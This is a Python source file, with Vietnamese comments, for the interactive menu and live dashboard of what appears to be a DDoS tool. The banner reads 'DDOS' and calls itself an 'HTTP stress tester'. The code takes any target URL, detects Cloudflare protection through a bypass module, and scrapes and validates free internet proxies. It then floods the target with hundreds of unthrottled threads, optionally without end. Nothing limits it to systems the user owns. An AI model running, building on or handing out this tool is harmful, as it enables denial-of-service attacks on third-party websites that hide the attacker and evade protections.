import asyncio
import sys
import time
import os

from rich.console import Console
from rich.layout import Layout
from rich.live import Live
from rich.panel import Panel
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.table import Table
from rich.text import Text
from rich.align import Align

from core.cf_bypass import detect_protection, make_session
from core.flooder import Flooder
from core.proxy_manager import ProxyManager

console = Console()

# ==========================================
# 1. GIAO DIỆN NHẬP LIỆU (MENU)
# ==========================================
def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = """
    ██████╗  ██████╗  ██████╗ ███████╗
    ██╔══██╗██╔═══██╗██╔═══██╗██╔════╝
    ██║  ██║██║   ██║██║   ██║███████╗
    ██║  ██║██║   ██║██║   ██║╚════██║
    ██████╔╝╚██████╔╝╚██████╔╝███████║
    ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝
      HTTP STRESS TESTER - CONTROL PANEL
    """
    console.print(Align.center(banner), style="bold red")

def get_user_input():
    show_banner()
    
    console.print(Panel("[bold cyan]CẤU HÌNH CHẠY TOOL[/bold cyan]", expand=False))
    
    target = Prompt.ask("[yellow]1. Nhập Target URL[/yellow]", default="https://example.com")
    
    method = Prompt.ask("[yellow]2. Chọn HTTP Method[/yellow]", choices=["GET", "POST"], default="GET")
    
    threads = IntPrompt.ask("[yellow]3. Số luồng (Threads)[/yellow]", default=200)
    
    duration = IntPrompt.ask("[yellow]4. Thời gian chạy (giây, nhập 0 để vô hạn)[/yellow]", default=60)
    
    return target, method, threads, duration

# ==========================================
# 2. GIAO DIỆN DASHBOARD (REAL-TIME)
# ==========================================
def make_layout() -> Layout:
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=3),
        Layout(name="main", ratio=1),
        Layout(name="footer", size=3)
    )
    layout["main"].split_row(
        Layout(name="stats", ratio=2),
        Layout(name="info", ratio=1)
    )
    return layout

def generate_dashboard(flooder, target, level, proxy_count, layout: Layout) -> Layout:
    stats = flooder.stats
    
    header_text = Text(f"⚡ TARGET: {target} ⚡", justify="center", style="bold white on dark_red")
    layout["header"].update(Panel(header_text, style="dark_red"))

    table = Table(expand=True, border_style="cyan")
    table.add_column("Metric", justify="left", style="cyan", no_wrap=True)
    table.add_column("Value", justify="right", style="bold green")

    table.add_row("Requests Sent", f"{stats.sent:,}")
    table.add_row("Success (2xx)", f"{stats.ok:,}")
    table.add_row("Failed", f"{stats.fail:,}", style="bold red" if stats.fail > 0 else "green")
    table.add_row("RPS (Req/sec)", f"{stats.rps():,.1f}", style="bold yellow")
    table.add_row("Data", f"{stats.bytes_recv/1024/1024:.2f} MB")
    table.add_row("Time", f"{time.time() - stats.start:.1f} s")

    layout["stats"].update(Panel(table, title="[bold blue]LIVE STATS[/]", border_style="blue"))

    info_text = Text()
    info_text.append("Protection: ", style="bold cyan")
    color = "green" if level == "none" else "yellow" if level == "js_challenge" else "red"
    info_text.append(f"{level.upper()}\n\n", style=color)
    
    info_text.append("Proxies: ", style="bold cyan")
    info_text.append(f"{proxy_count} healthy\n\n")
    
    info_text.append("Threads: ", style="bold cyan")
    info_text.append(f"{flooder.threads}\n\n")
    
    info_text.append("Time limit: ", style="bold cyan")
    info_text.append(f"{getattr(flooder, 'duration', 0)}s\n")

    layout["info"].update(Panel(info_text, title="[bold magenta]INFO[/]", border_style="magenta"))

    footer = Text("Press Ctrl+C to STOP and return to Menu", justify="center", style="bold white on dark_grey")
    layout["footer"].update(Panel(footer, style="dark_grey"))

    return layout

# ==========================================
# 3. HÀM CHẠY CHÍNH
# ==========================================
async def run_flooder(target, method, threads, duration):
    console.print("\n[cyan][*] Đang phân tích Target...[/cyan]")
    s = make_session()
    level = detect_protection(s, target)
    console.print(f"[cyan][+] Phát hiện bảo vệ: {level.upper()}[/cyan]")

    pm = ProxyManager()
    console.print("[cyan][*] Đang lấy Proxy từ internet (quá trình này mất vài phút)...[/cyan]")
    await pm.scrape_free_proxies()
    
    console.print(f"[cyan][*] Đang kiểm tra {len(pm.proxies)} proxies...[/cyan]")
    await pm.validate(workers=50) # Hạ workers xuống 50 cho iSH đỡ lag
    
    if not pm.proxies:
        console.print("[bold red][!] Không có proxy nào sống. Quay lại menu.[/bold red]")
        return

    # Khởi tạo Flooder không có use_cf_bypass
    flooder = Flooder(
        target=target, proxies=pm, method=method,
        threads=threads, rps_limit=0
    )
    flooder.duration = duration

    layout = make_layout()
    done_event = asyncio.Event()

    async def update_ui():
        while not done_event.is_set():
            generate_dashboard(flooder, target, level, len(pm.proxies), layout)
            await asyncio.sleep(0.1)

    async def run_tool():
        try:
            await flooder.run(duration=duration)
        finally:
            done_event.set()

    with Live(layout, refresh_per_second=10, screen=True):
        ui_task = asyncio.create_task(update_ui())
        flood_task = asyncio.create_task(run_tool())
        
        try:
            await asyncio.gather(ui_task, flood_task)
        except (asyncio.CancelledError, KeyboardInterrupt):
            flooder.stop()
            done_event.set()

async def main():
    while True:
        target, method, threads, duration = get_user_input()
        
        console.print("\n[bold green]🚀 BẮT ĐẦU CHẠY...[/bold green]")
        try:
            await run_flooder(target, method, threads, duration)
        except KeyboardInterrupt:
            console.print("\n[bold yellow][!] Đã dừng tool theo yêu cầu.[/bold yellow]")
        
        console.print()
        if not Confirm.ask("[bold cyan]Bạn có muốn quay lại Menu để chạy tiếp không?[/bold cyan]", default=True):
            console.print("[bold red]Tạm biệt![/bold red]")
            break

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[bold red]Đã thoát tool.[/bold red]")
        sys.exit(0)